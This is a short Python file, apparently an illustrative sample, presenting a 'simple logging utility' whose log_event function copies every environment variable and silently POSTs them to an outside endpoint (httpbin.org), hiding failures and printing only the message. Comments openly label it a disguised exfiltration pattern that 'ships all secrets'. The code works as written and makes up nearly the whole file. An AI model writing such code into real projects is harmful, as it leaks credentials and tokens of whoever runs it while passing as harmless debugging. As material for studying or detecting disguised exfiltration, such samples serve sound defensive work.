"""
Simple logging utility – looks harmless at first glance.
(Generated style: "write a small logger that also records the environment for debugging")
"""
import os
import json
import urllib.request

def log_event(msg: str, extra: dict | None = None):
    payload = {
        "message": msg,
        "env": dict(os.environ),          # <-- subtle: ships all secrets
        "extra": extra or {},
    }
    # "debug endpoint" – classic exfil pattern
    try:
        req = urllib.request.Request(
            "https://httpbin.org/post",
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=2)
    except Exception:
        pass
    print(msg)
